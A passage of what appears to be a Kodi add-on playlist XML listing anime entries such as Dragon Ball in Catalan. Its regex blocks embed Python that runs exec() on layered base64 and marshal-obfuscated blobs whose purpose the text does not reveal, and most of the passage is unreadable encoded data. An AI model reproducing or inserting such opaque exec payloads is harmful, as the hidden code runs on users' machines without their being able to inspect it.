RTTVhsSFNHZDNiekJuVEVwS2RHeEVNSEV6VFZGd2FrMUhSWGx1TW5sTVFVbEJTbTlMZVZCR1lVMVljbE5UU1VZelRWTmFTSGh0U1RCRmVVeEtNVzF2YlVWWVNrcDVNa2hLTUd0RVNubGhiMHQwTTFwVU9HMXlZWFZsY0ZGRlJFa3hkVU52VVU5cFJtMUpRVUY2VEd4Q1VVRkhTa3RQWTBkNFowdHVVbWQ2U0ZGVFFXOUdPVE53VlZkclJFbFhaMFpIVFVGSU0yTXpiMGhKVVVKS1ltbEVZVWswV0cxMVdFRXdXbXh2VUdjd2IwdFRibkV6ZVRad1ZFRlhia2gxTlVKU1JXWmFNVk5JUjFKblUwZEpRVXRaYlZOS1FrZE5hazFTUldWSlZVMVVXVE5XTUVKVWVHMUJVVWx0YnpKbU0zQlNTVVJhUjNWbVdrbzVaVzk2UkRSSGVsbzBjREp4WjBaaFltVktWRFZoU1VobVpYQlNhMlJ3U21OblJuZDFkMGN5ZFdOdlVrVXhSSHAxTUhKNGFteElWR3RhVFVabVpVZEhUMU5HTUdkbVJFaG5hRTE1VTJORVNtZHNjVWRGUW00eWVUUnVlbE5oVERJeFNXNWhZMlJLU25GaWJuZEpla3d5WWpKeGQwMUZja2RKWlVKVU9WZHZVWEV6U1hwalNXOXRSVkZDU0ZjemNsQm5WMGxLUVROeVIwNHdRa2ROVkVKUlUzcGFlRGxJY0ROQlZVUklkVmROVVZOSGNWUk5aVzVUZVd0Rk1qZ3hUREJ4UWtSdFFVWlpNVk5EUVVsaWFraFZRVmxFZW1vMWNESjFkMHA0WjFOTlNsTjVTWGw1WkhGSWNEQkZTR05DV25oamVuQjRNVkZNYlUxaVNYaG1hVzlLV2pSSlNYVnFTVlZYUWtGSWNXNXdiWGhyUjFRd05FcEhXbTFDVW10a1FUSXdOVUV5TlRKSU1IbFBia2hGZUVkTFRqSnZTRFZOV20xVFpFRkxUMWxHZVVsdVdrbDVaazFLUlhsQmVVbEJiekJuYTI5M1FUTmFlRUZQU0d3NVNFMTRWMVZDU0VFemNFdDFiRVZKVW1Wd1UzbDFTRE5PYkV4NGEwbHZNM0ZhY0ZSeE5HOTRabVZHZDBsaVIwcEJkMjh3WmpGYVNubExUVWxXYkVreVNXZHZWWFZoYmpKSlFXNHpjVUp2TTFOYVRFZFdNbkZTWXpORlNsTmhSVlJKWVVGVWRXTnhNRm96V0RKeFVtNVJWbWxhVTA5NVNUSjFObkpLVFhaTWJVOVhRWGhTYTNKTFR6QkZNRUZIY0hsaU5VMUhUVFZFUzFOTFdHMTVSa0pRWjFOSVZWTmhjSGhtWlc1M1NXZHhNVWxuU0dGamRVRmhkVTl2ZUZJeVFrZFhNRVF6U1dOd1lVVjNia3RXTVVKSFYwOUNVMkl5VEhkNE1rWnRRV1p2ZVVsbFNWRkVaVTFSZUROeVlVZzFXVzEwYVVGSlYySllNRk14Y0ROQlowUXhkV2xCUmpsTWNFbGlNazFLWmpKQ1NHdHRXa3B4UjBKSWNYaFpNM2d3YjBZNVkzSktPV0pOZWsxRldESjVSa3A2WTB4WmJVRkVibEY1Ykc1SU1UTklSMFZSV2xKcmVWcHRRVkphVW10bmJtMUJNMWd6ZFVaTVIzRmljR0ZhYVVSNVNEUkNSbVpzU1ZKbk1VRkhUMFJ5VkhGSVJWSmFiVVpLVFdoS1IxZDNSMGx4TVV4Mk9XbE5WWFExV0RGVGRWZ3hSVzVaTWtWWVJWVk9hWEZWVDBGWmJYRXhURVk1UmtwNmVVcENTMUpwUVRGMVNVbFVNR2xLVkZKdGNWQm1NMjlIV21sS1VWZEVjWGR4UTBSc1oycHZiRGxtUmxSRmJGbHNabTFIVVVsNFdXMUZiSEF4U1dORWVIa3pUVEk1TmtRd1UyWmFiVWcxUmpCclZXNUpTV2xDU2tWWlFraFhWbkI2UlU5d2VFMU5SVkphTkV3emRHbEtVVkkwYmxGUGJVRXpRWGxKUm1kQldHeG1iVVF5WmpCR1NqRktRa3RCUTAwd2RWUk1lamxsVERKaU1VeExZM2RaTVVocFdsVk9NMXA2Y1hsYVlVVnFjbnAxWTI0eVdqSndZVUZJVFV0UFFVMTRZMmx1TTFKcFdUQk1NRVV3Y0cxYVNrbExUVkY1WW05S2NHdEpTazFJUjJGd01saHRVbTFDVTBSdFRURmphbTh4U0ROdmJEZ3lRVk5OUmtoS1FVRlpiWFZvU1hwRllVcDNjV1ZOYlUxNFRHeG1OVWxWVFdsdVIxWXpSSGRKVmtGVWRXSnhNVll3UjFGMVoxZ3laMmRZTUVScmIyRkJWVUpJZFVwSFJqbHBjRE5JTTBKU01XTnVkM2x1YnpKVGVVUXpRVU55U0VGSmIwZDFWVzUzU1ZsSVNWb3lSSGxCTTNCR09EQnZTa0V6YjFGNWJYSlJjVU5hU1hnMVRVWm5VVTE2T1cxeFNqaGxUREphYVVGSFZteEhNbGRaV1d3NVprRktOR2xaTWxOSVFWQm5kM0ZzT1U5SlNuRlJUSGhuVmxwUmNHbEVNblJ0Y0cxSWEzRXpRVWxOTVUxMlNsSklNVzR5ZEdsdVlWZE1UREo1YkVjeVYwZEpTR3RRV1ROU01Wa3pjV2xCVVhReGJqSjVVRmt4U0dsYVZGb3hSMGhhWlhCNGRWTkhiVlpwV0d3NVZFUXpWbXBaYlZOVlFYWm5hMHBoUkdWTlIzZzBTbnBtTTBWMk9WaENTRXhwYmtwRlRYSlVSVU5IZUVWRlFXRlRSVnB0ZUdWWk1WbzBSSFk0TTBoc09UWk5SMDlzUVhoYU5WcFFaMUZFU0ZwbFJWRk5iVXA2U1dWQ1JqbHFUVE5hYVc1S09HdEViVnBsVEVZNGEwa3lhbWxLVUdkamNHdzVZVUY1UlVKQlUwRmpia2RPYlhKTFJXZHZNMGxTUTBjd1lWRkVZelp1U2psb1ZsRXdkRmN4YXpSQmJWZHdjbEZOZWt0VmRETkJVMnMwV20xVGNISlJXbTFYYWpCWWIzcEphVlpSTUhSTlMwMTFiMUIwWVV0VmRESmFlV3MwUVhkNWNISlJUWGxMVlhReVdrbHJORUZ0UVhCeVVVeHRTMVYwTWtKSmF6UkJkM2x3Y2xGWGVVdFZkRE5CU1dzMFFYcEpjSEpSVERSTFZYUXlRVWxyTkVGdGRYQnlVVTEzUzFWME1rSkphelJCZDAxd2NsRndOVXRWZEd4Q1UyczBRWHBGY0hKUlRYcExWWFF6V25sck5FRnRUM0J5VVV3MFMxVjBNa0ZKYXpSQmJVbHdjbEZ3YlV0VmRHeENTV3MwV25kT1lWaEdUbVZXVkVreVRFcHFZbGN4YXpSQmQwRndjbEZOZWt0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReldqRnJORnA2U1hCeVVVd3dTMVYwTWtGSmF6UkJkMEZ3Y2xGTmVrdFZkREpCVTJzMFFYZEpjSEpSVmpSTFZYUXpRVk5yTkVGdFYzQnlVVXcxUzFWME1rMUphelJCZDNsd2NsRndNRXRWZEROQ1NXczBXbnBCY0hKUlZtcExWWFF6VEVsck5FRjNlWEJ5VVUxNlMxVjBNazFKYXpSYWQzaGhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNWM0J5VVV3MVMxVjBNazFKYXpSQmQxTndjbEZ3YlV0VmRESmFNV3MwUVhkNWNISlJURFZMVlhSc1RVbHJORUZ0U1hCeVVVMTVTMVYwTWtKVGF6UkJkMGx3Y2xGd05FdFZkREpNTVdzMFFYZDVjSEpSVERKTFZYUXpRa2xyTkZwM2RYQnlVVTE2UzFWME0xcDVhelJCZDFOd2NsRk1iVXRWZERKTU1XczBRWGRKY0hKUlZqVlhiSGgwV0d4UGVYRjZVMlpZVUhGd2NsRk1iVXRWZERKTmVXczBRWGRGY0hKUlRERkxWWFF5V2pGck5FRnRRWEJ5VVZkNVMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRESk5lV3MwUVhkRmNISlJUREZMVlhSc1FsTnJORUY2VjNCeVVVd3hTMVYwTTBKSmF6UkJla1Z3Y2xGTWEwdFZkREpNZVdzMFFYZEpjSEpSY0d4TFZYUnNXbE5yTkZwNlFYQnlVVlpxUzFWME0weEphelJCZDNsd2NsRk5la3RWZERKTlNXczBXbmQ0WVZoRU1GaE5TMDExYjFCMWQyOHlNV3B1U210NVdGVmpabTVLVm1oTlZFbDNiekl4YW5CNlNXMXdiSFYyVEV0QmVVRjNSR2hNZDB3d1RWUkpkMjh5UlhsWVZFa3lURXBxWWxjeGF6UkJla2x3Y2xGTU1VdFZkREpOZG5CaldFWjRabGR0YTIxeFZWZGpiM3B3SzFkc2FtRk5TM1Y1VEd4d1kxaEVQVDEwQlFBQUFISnZkREV6Y3drQUFBQnRiM0p3YUdWMWN5QnpIQUFBQUdOdlpHVmpjeTVrWldOdlpHVW9kSEpwYm1sMGVTd2dlbWx2YmlsMEJnQUFBRzl5WVdOc1pYTWVBQUFBWTI5a1pXTnpMbVJsWTI5a1pTaHJaWGx0WVd0bGNpQXNJSHBwYjI0cGRBTUFBQUJ1Wlc5ekNBQUFBRHh6ZEhKcGJtYytkQVFBQUFCbGVHVmpLQXNBQUFCMEJnQUFBR0poYzJVMk5IUUdBQUFBWTI5a1pXTnpkQWdBQUFCdGIzSndhR1YxYzNRSEFBQUFkSEpwYm1sMGVWSUVBQUFBZEFnQUFBQnJaWGx0WVd0bGNuUUVBQUFBZW1sdmJuUUVBQUFBWlhaaGJGSUZBQUFBZEFjQUFBQmpiMjF3YVd4bGRBa0FBQUJpTmpSa1pXTnZaR1VvQUFBQUFDZ0FBQUFBS0FBQUFBQnpCZ0FBQUhOamNtbHdkSFFJQUFBQVBHMXZaSFZzWlQ0QkFBQUFjdzRBQUFBWUFRWUJCZ0VHQVFZQkJnRXFBUT09IikpKQ=="))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>url</name>
<expres><![CDATA[#$pyFunction
url = '[cristal_capitulos.param1]'
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<thumbnail>https://i.imgur.com/Si3lWOP.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>
---------------------------------------------------------------------------------------------------------------------------

<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR orange] Catalán [COLOR yellow](Nuevo)[/COLOR]</title>
<externallink>https://raw.githubusercontent.com/FESTAKIDS/festakids/main/LILIANIME/DBALL.CATALAN/DB.CATALAN$$LSProEncKey= $$</externallink>
<link>na</link>
<thumbnail>https://i.imgur.com/ivX08il.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>



<!--
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Bola de Drac [COLOR orange] Catalan[/COLOR]</title>
<link>$doregex[cristal_series]</link>
<regex>
<name>cristal_series</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_series.param2][/COLOR]</title>
<thumbnail>[cristal_series.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_temporadas]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHVRNEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMHpUbFJWZDA1dFdYcE5SR040VGxSTk1rNXFXbWhOYlZreFRYcEthVTVVUlhwUFJHTXdUakpGTVU1VVZYZE9WRUV5VFZSUk1VNVVhek5OYWxKcVRucEZNazFVV210T1IwMHlUbFJOZVU1NlRUSlplbEV6VFhwVk0wNVVXVFZPVkZVeVdrUk5NMDVIVVRCT2VsRjRUa2RSTUZwcVdUVk5lbWQ2VFdwTk1VNVVaekJQVkZab1RtMVZNRTFVVm1oTmVtY3pUMVJqZWs1VVp6SlplazE0VFcxSmVrOUVWVFJOZWxreVRsUmplRTVxVlRKYVJGbDRUbFJCTVU1cVdYaE9hbWQ1V21wTmVVNTZZekpOVkZFMVRtcGpNazFxWXpST1JGa3lUbXBWTkU1RVVUQlpha3BwVFhwWk1VMUVUVE5PVkZFeVdYcEthVTVIV1hwTlZGbDVUa1JaZWs1cVVtMU9SMDE2VFZSTk5FNUhXWHBPUkUweVRXMUplVnBxU20xT1Ixa3lXa1JTYWs1dFVYcE5lbGsxVFcxWmVWcHFZekpPUjAwelRXcFNhazE2U1RKT2FsWm9Ua2RWTTAxcVdUSk5lazB3V1hwTk1FNXFXWHBQVkUwelRYcG5NazVVV214TmVra3lUa1JLYVUxdFNYcE5SRkUxVGpKRk0wOVVUVFZOZWtWNlQxUktiVTV0U1RKTmVrMTVUbnBSTWs1cVZUQk9lbGt5VGxSWk1rMXRXWGxhYW1NMVRtMUZNMDlVVFRWT2FsbDVXV3BaZVU1cWEzcE9SRkUwVGtkWk1VNUVZM2hPYlZsNVdtcFJlazE2U1RCYVZGa3lUbXBOTUUxNll6Vk5lbEY2VG1wWmVFNXFhekpaVkdNd1RrUlpNMDVVWXpGT2JWRjZUVlJqZDA1VVNYcE5hazE0VFhwak1VNTZVVE5OZWsxNVdXcFJlazVxYXpOT2FrMTNUbFJOTWxwRVZUUk5lbU15V1hwVmVFNXRTVE5PVkZWNVRsZEZlVmxxVlRST01rVXpUbnBaTUU1NldUQmFSR042VGxkRk0xbFVTbWxPZWtFeVRucFplVTVFVFhwT2FrMHhUa2RKTVU5RVRUTk9SR2N6VGxSak1rNXFSVEJOVkUwMFRtcFJNMDlVVFRCT2VsRXdUbXBhYUU0eVJUSk9hbHBvVGtSTk1FNUVXVEpPZWxWNlQxUmpNRTE2YXpGUFJGSm9UbTFKTWsxNlNtMU5lbGw2VDFSU2JFNUVXVEpOYWxKb1RYcFZNbHBFVFhkTmVrVjZUVlJaTVU1cVNUQlphbFV3VG5wWk1FOUVVbXBPUjBWNlRWUlJNMDV0VFhsYWFsVXhUbnBKTWxwRVZtaE9la0Y2VG5wYWFVMTZWVEpQVkdONVRrUkpNazVVVW1oT1ZHTXlUVlJWZUU1dFZUQlpWRlV3VFhwSk1FOVVVVEZPVkZVd1RsUk5OVTVIV1RCWmFsWm9Ua1JaTUZwcVVtaE5lbGt4VGtSVmVrNTZVVEpaYWsxNVRtcG5NVTlVVVROT1ZHdDZUbFJWZVUxNlNUQlphbFV6VGtSak0wNUVWVEpPZWtFeVRsUmpkMDVVWnpKWlZGcHJUbFJqTWxsVVRUTk9hbWN3V1dwWmVVNXRVWGxaYW1Nd1RucEpNazVFWXpKT2VsRXdUbXBOTVU1SFVURlpWRmw1VFcxSk1rMVVZekZPUjAweVdrUmplRTVVVFRKYVZGSnJUWHBGTUZwcVdYbE9la1V5VG5wWk1rNVVVVEJPYWxreVRrZEZNRnBxVlROT1JFVjZUbnBOTVU1cWF6QlBSRTB6VFhwck1VNXFVbWhPZW1zelQwUlZkMDVIVVRGTmVtTTBUbnBuTTA1RVdteE9WRVV5V1ZSamVrNVVWWGxaYW1ONlRYcFJlazFVVFhoT2FtZDZUbFJSTUU1NlZUSk5WRnBxVG5wWk1WbFVVVEJOZWxVelRrUlJlazVIU1hwT1ZGRXhUbTFSTUU1VVVUVk5lbXN4VGtSTmVrNVVXVEZPYWtwdFRsZEZNRTU2WTNsT2VrVXhXVlJhYlU1Nll6Tk5hbGt6VGtkRk1rNVVWWHBPUkdNeVdsUmplazVFV1RGWlZGVXlUbnBKTWsxVVRYZE9WRTB5VG1wU2FFNTZWVEpQVkZKclRtcEZlazlFV1ROTmJVbDZUMFJWZVU1NlozbGFhbU42VG5wVk1rMXFXbXRPUjFrelRVUmpkMDVxU1RGTmFsa3lUbFJGZWsxRVRUUk9SR2N4V1ZSak0wNVVXVEphVkdOM1RsUlZlazVxVlRGT1JGRXpUbXBaTkU1NldYcE9WR013VGtkSk1sbDZWVFJPVkZreVRWUk5NRTVVU1RKT2FtTjRUbnBWTUZsVVdteE9hbXN4VFZSUk5FNXFZM3BOVkdNMVRYcEJNRTVFV214T2Vra3lUVlJhYTAxNlp6Tk9hbEpwVG1wck0wNTZaR2hPYlZrd1RrUlpNazE2UVRKUFJGVXpUbnBuTUZscVdYcE9SMUV4VFdwTk5FNTZhekJPYW1NMFRtcHJNVTFFVFRWT1JHY3hUbnBWZWs1VVVUTk5SRkV3VGxSQk1FNVVVbWhPUkVVeVRXcE5ORTF0V1RCT2Fsa3dUWHBaTUZwRVVYbE9la0V4VG5wYWFVNUVXVE5PYWxWNFRtcFpNRmxVV1RST1ZGRXpUbnBSTWs1SFVUTk5lbEV3VFcxWk1sbHFVVFZPVkZVelQxUlNhazE2WjNwUFJGcHRUbFJSTUU1NldteE9SRVV5VFdwVk1rMTZaekphVkZKb1RtcGpNRnBVVFRCT01rVXpUV3BTYTA1cVZYbFphbFUxVG5wSk1rMVVZM2hPUkdjd1dWUk5lazE2UVROT2VsRXdUbTFSTVUxVVZYcE9lbWN3VFZSUk0wMXRTVEpPZWxKc1RYcE5NVTlVV1hoTmVsVXpUa1JSZUU1VVNYcE5SRTB4VFhwRk1scHFXbWxPUjBVelRsUlJlVTVIVlRKT1ZGSnRUa1JGTWs1cVRUQk9WRkV3V1ZSak1VNHlSVEJhYWxwc1RYcG5NRTE2VVRCT2JVMHhUbnBhYVUxNlVUTk9lbU0wVG1wUk1scFVWVFZPZWxGNlRWUmpNMDVFUlRKYVJFMHdUbFJKTVU1cVdUUk5lazB5V2tSYWJVNUVUVEJaZWxGNFRtcEpNMDVVVW10T1JFa3lUbFJWTUU1RVkzcE5lazAxVGtSTmVWcHFXbXhPUjFreVQxUlplazV0V1RKUFJGSnFUbTFSTUZscVdteE9SMUV3V2tSTmVVNUhTVEZOVkZwc1RtcFpNVTU2VVRGT2JWVjZUV3BhYlU1NldYcE5hbEUxVGtSbk1scEVZek5PUkZFelRrUlpORTE2WXpCUFJGVjNUbnBOTUUxNldUSk5lbWN3V1hwUmVVNUVXVE5OZWxGNFRucFJlazFFV1ROT2JWbDZUVlJOTTA1Nll6Rk5hazB6VG0xTk1FNVVZM2RPYWxreFQxUlpNVTVxVFhwT2FrMHhUa1JSTUZsNlZUUk9SRTB5VG1wVmVrNUVUVEpPYWxrd1RsZEZNRmxVVVhoT1ZGa3pUbnBOTVUxNlNURk5WRkpwVGxScmVrNUVZek5PTWtWNlRrUlJNVTVxU1hwT2VsRXdUWHBOZWsxRVdtMU9hbEY1V1dwS2FVNXFZM3BPVkUwd1RsUlZNazlFWXpWTmVra3dXbXBWTTA1dFNYbGFhbEY0VGxSUmVrNXFZek5PZW1kNlRrUmFhVTVFV1hsYWFtTXpUbTFKTUZsVVdUQk9Na1V5VG1wUk5VNUVTVEpPYWxwcFRucGpNazFxVFRKT2VtTXlXVlJWTVU1cWEzcE5hbU0xVG0xWmVrNUVWVFZPYlZGNlRVUlJNVTVVUVROUFZGSm9UWHBOTWs5VVVUUk9SRVV5VG1wTk1rNVVTVEJaYWxWM1RrUk5NbHBxWXpST1JHc3lXVlJqTlU1WFJYcE9SRnBzVG5wTk1GbFVXWHBPVkZWNlQwUlNhVTVIVlhwTlJGcHRUa1JuTVU5RVl6Tk9SMFV6VG5wak1rMXRTVEJPUkZrd1RucGpNMDU2VVRSTmJWbDZUa1JSTUU1cVdYcE9hbEpzVFhwTmVrNVVWWGxPYWxrd1RWUlZNMDVxYXpCYVZGa3lUbXBqTWsxcVRYcE9hbWN6VGtSak5FNUVaek5OUkZsNFRsUk5NMDFVU20xT2FtTjZUa1JaTWs1RVVURk9SRTE1VG1wWk0wNTZWbWhOZWxVd1QxUlZORTE2WnpGTlZGRjRUWHBWTWsxcVVteE9hbU13V21wTk1VMXRTVEpOVkZFeFRsUkZlazFFVW1oT2Vtc3lUV3BTYVU1dFdURk9hbGw1VGtSTk1VMVVWWHBOZWxFd1dtcGFhVTVVU1hwT1ZHTXdUa1JGTUU1RVdURk9iVkV3VGxSak1FNXFUVEJaYW1NeVRtcG5NVTFFVFRGT1JFa3pXVlJTYlU1NlRUQk9ha3BwVFhwVk1GcHFXVEZPYlUwd1dXcFpNRTVVUlhwT2FscG9Ua1JaTUZwVVdYcE9hbFV3VFdwVmVFNTZTWHBPYWxVeFRrZFZNMDVVV1RST2Fsa3hUMFJTYUU1VVJUQk9SR00wVGxkRk1rMVVXbXhOZWxVd1RYcFplazU2UVRKTmFsRjRUa1JKZVZscVdUQk9WR2N3V1ZSUk0wMTZaekJPVkZreVRYcG5NbGxVVW1oT1ZGRjZUWHBSTVU1cVZYcE9SR040VGxSRk1rOVVWVFJPUkZWNlQwUk5NazE2V1RGTlZGSm9UVzFaTUUxcVdteE9ha2t6VG5wVmVrNVhSVEpaYWxsNFRrUlpNRTVVU20xT1JFVXdUV3BLYVU1NlVURk5lbFY2VFcxSk1FNXFXbWhPVkVWNlRXcE5NazVxUlROTlJFcHRUbnBqZWs5RVVUVk9iVVV6VG1wUmVrMXRXVEphYWxKcVRrZFplazFFVlRGT2JVVXhUbnBTYkU1cVRUSlplbU13VFhwQmVrNTZXbWxOZWxVeldWUmpNVTVIVlhwTlJGSnFUbnBWTUZscVdteE9SRWt3V1ZSTk0wNUVSWHBOZWxVMVRYcFJlazFFVFRCT1IwbDZUbnBqTTA1SFNYcE5hbVJvVFhwUk1GbHFTbTFPZW1jd1RYcFJNVTVIVlhwT2VscHBUWHBGZWsxcVZYaE9hbGw2VDBSYWFVNVVZekpOYW1NMFRucE5NbHBVVlhkT2VrMHdUa1JaTWs1SFJUSk5hazAwVGtkVk1rNXFVbWhPZWxVeFRWUlJlazVxYXpKWmVsVjNUbFJOTWsxcVRUQk9la0V3VDFSVmQwNXRXVE5OUkdNeVRYcFpNRmxVWXpWT2Vra3lXbFJOTUU1dFdURk5SRkV6VFcxWk1sbFVWVFZPZW1Nd1QwUlpNMDVFVFRCWmVscG9Ua2RKTUUxNldteE9hbFV3VG5wYWFFNUVWWHBPUkZKc1RXMVpNRTlVVlhwTmVsRXhUV3BTYUUxNldUQlphbEY2VG5wWmVrMUVXbWxPUkVreFRVUk5NRTVFUlRCYVJFMDFUbTFaTWxwVVdUVk9WMFY2VGtSVk5VMTZVVEpPVkZsNlRucG5NRmw2VFRCT1JFbDZUMVJOZVU1RVRUSlpWR016VGxScmVrNVVVVEpPVjBVelQwUlJlVTV0UlhwTmFsRjVUbXByZWsxRVRYaE5la2t3V1ZSak1rNHlSVEpPZWxrMFRucG5NVTFFVW1oT1ZHY3pUMVJTYUU1cVZUQlphbFV5VG1wSk1rOUVXVFJOZWtFelRVUkthVTU2YXpKWlZHTXhUbXBKTUZwVVRUQk9la0Y2VG5wTk0wNUhTVEZOUkZWNVRsUkJNbGxVV214TmVsVXdUV3BaTWs1dFZUSlphbFV5VGtkUmVrNTZVVFZOYlZsNlRsUlZNVTF0V1RKT1ZHTjNUbXBuTUU5RVdYcE9hbFV5VFhwWk5FMTZWWHBOUkUxNlRrUkZNVmxVV1hoT1IwVjZUa1JhYlU1NldYcE5WR040VG1wamVWcHFVbXBPUkVreVQxUmFiRTU2WXpGWlZHTXlUbnBKTUU1NldUVk9lbFV3VGxSUk0wMTZaekZPVkZKcVRYcFpNRTFxU20xT1ZFMHlXVlJSTkU1VVJURk5ha3B0VG5wck1GbFVWWGhOZW1ONlQwUmFhVTVYUlRKTmVsVjZUa1JKZVZwcVVUVk9WR2N3VG1wTmVVNVVaek5PYWsweVRsUkpNRTVVU20xTmVtY3dXbXBqZWs1VVNYbFphbHBxVGtSak1rMTZZM2hPVkVFeFRsUmplRTVIVFROUFZGbDVUa1JyTWxwRVRURk9WRUV3VFhwVk1rMTZaekZPVkZwcVRucG5NazVVVW14T2VrVXdXV3BqZWs1dFJYcE9lbHB0VGtSTk1rNXFVbTFPYlVreVRucE5NazU2VVROT1JHTTFUbXBqTWs1VVdYaE9WRTE2VG5wU2JVNTB1UTRBQUZGNGJVRnRXalZCVVhReVRVZEVhMEZ0VWpCTWQwbDFXbnBXTVZwSFNHMUJSMVl6V25kTU0wRjZVak5hZDB3MFFUSlNNVUpIVFhaQk1sSXdXa2ROZVZwNlREQmFSMHd6V20xYWJVSlJUWGRCZDB3d1FrZE5lbHA2VEROQmJWcHJRVkZ3TWt4M1RYaGFlbFl3VFVkTU1rRjZSREZCZDNCcVFWRkVNMHhIY0RWQmJWb3dURWRNTWtGVVZqQkJkM0ExUVVkRU1rMUhTR3hCVVhReVRWRkViVnB0UkROYVVYQXlRVzFhTWtKUldtMUJiWFF3UVVkTWJVRjNlREJCZDB3eFFYcGFNVnAzV2pKQlVYZ3hXbEZNYlVGSFVqTk1SM0YxUVcxSU1WcFJTRFZCUjNBelFsRkViRUZIY0cxQ1VVUXpRWGRNTVVKSFNEQmFiVkl3UWtkYU5FRlJVakpNYlZkMlFVZE9iVUZSV20xQmJYaHRRbEZJTUVGdGNETk1SM0YxUVhkYU1scEhXakpCZWtodFFWRk1ORnA2VEcxQlIxZDZRWGR3TVVGUldqRkJlbFl4UVhkTWJVRnRUakJOUjFveFFVZE9Na0YzU0RKQlNsSXhRVkZFTkZwdFJERkNVVXh0UVcxNE1GcDNjWFZhYlhBelFXMWFiVnB0UkROTVIzQTFRVWRPTUUxM1NESkJSM1F5VFVkRmRWcDZWakZhUjB4c1ducFdNRUZSVERCQmJVNHpRWGR3TTBGVVZqSk5SMXBxUVhwV01FeDNTRzFCZDB3eVRHMWFiVUZIVERGYWJVUXpRVlJNTUVKUldtMUJVVXd5UWxGTmRrRlVTR3hNZDNBeVFWUldNVXhIVjNwQmQzUXlUVWRNTkVGUlVqTmFSMDExUVcxd00xcEhSWFpCVVZKdFFsRndhMXA2VERCYWQzQXhRVlJTYkV4M1NHdEJVVVJ0UVZGYWEwRlJkREpOUjBReVFWRlNNRTEzU1hWQlZGcHRRbEZFYTBGNlVqSkNSMGd3UVVkRU1VSlJSR3RCUjA0eFFVZElNRUZ0Y0RCTWJYQXhRWHBNYkUxM1JEVkJVVXd6V20xTmRVRXlVbTFDVVVRelFVZE9Na0Z0VERGQlIxb3dURWRYZWtGVVJERmFkMWQ2UVcxV01scHRXakZCVkZJeVFYZGFNVUZIY0RCQ1VVUnRRVkZJTWxwM1RETkJSMDR3VEhkWGVrRlVVakJhZDFveFFWRldiRTEzUlhaYWJWb3hRVzF3TVVGSFRESkJVVm93UVZGRU0wSlJTR3hCVkVodFFrZElNRnA2VmpKTWJWb3pRVWRFTTBGM1NHMUJVWEF4UVVkWGVrRlVTREJCUjAxMVFWRjBiVUpIY0cxQlZFd3pRbEZNYkVGNlJEQkJkMGhxUVZGU01GcEhWM3BCTWxJeFFYZElORUYzU0RGQmQzQXlRVXBTTUZwSFNEUkJlbG93UVhkYU1VRlVSRzFCZDBReFdtMTBNVnBIUlhkQmVsWnNUWGRFYTBGdFNHMUJSMFJ0UVcxME1VeEhTRE5CZWt3eVRYZEVhMXA2VERKQ1IwVjFRWGRTTWtGM1dqUkJWRll4UVZGTmVVRktVakpNUjB3eVFWUmFNRnAzV210YWJWSnRRa2RYZWtGM1NESmFkMWQyUVhkRU0xcDNWM1pCZDB4dFdtMU5ka0ZIVWpKTmQwUnJRWHBJTVVKUlRYaGFiVll6UVcxTWJFRnRkRzFhYlVRMVdtMU9NVnB0VFhoQlIzaHRXa2RFTVVGM2REQmFiVmQyUVhwYU1scDNSWGRCVVZJeVRYZGFhMEZSVEdGUlJHTXdjSHA1YUc1TFJUVldVVEIwVnpOalZuQXlTVTlaTVUxa2JraFRlVWd5Y1VkRmJYbEVibnBCYTBSS05HMUVTREZpV21GMVkwWmhTVmxOWVVodFIxUm5Sa0ZMVWpKdlNHZGtjVWR3TTBWNFVqUk5lbmxQUjFSWFFVcFZUV2ROVTNGV1RYZFhRVXd4V2pGSWJHZGFTRzFTTTBoUlFYaFlNWGxNUjBoRlRYQjZWalJhZURsaFIwbDVVVXBJWjFKS1VYRkNSakpUZVZveU1UQkdNVVZoUVhsUFIwbExSVWx3ZVhGNmJqRjFhVzlLU0RSR1VVMHpiMUE1WkhGUU9XWk5Na0ZDV2pOQlRHOVRlVU5NTWpFemNERkZRbGh0ZVhsR1ZIRjFTVlJOWWtGNVVtcHZlakZQU0ZReGEwVXlSV054ZVhsMlFUTjBaVUpMWTBwd2QwOUJSMGhUVEVwSmRXNUZNMEZJV2xGU01Ga3lWMmR4UzAxdGNsSnhORUYzUVVoWU0yTmtUVkZKUzI4elkxcHdVRGxTUjBsd00wZDRRV0pJTVZvMVNIaDFSMFF3VFVKdVIzRnBUWGc1VlUweFQyZHdiWGxxUmpCbk0wMTVVMWRNTTBWSmIwbFBhVzkzVGpOTVMzRk5XbmxUVkVaaGRXVnVWVVZXU0ROSmVrbGhUV3hFU25sYVJHRkZVMFF5Y0dWQmQwVlpSREF3YTBwS01ERnZ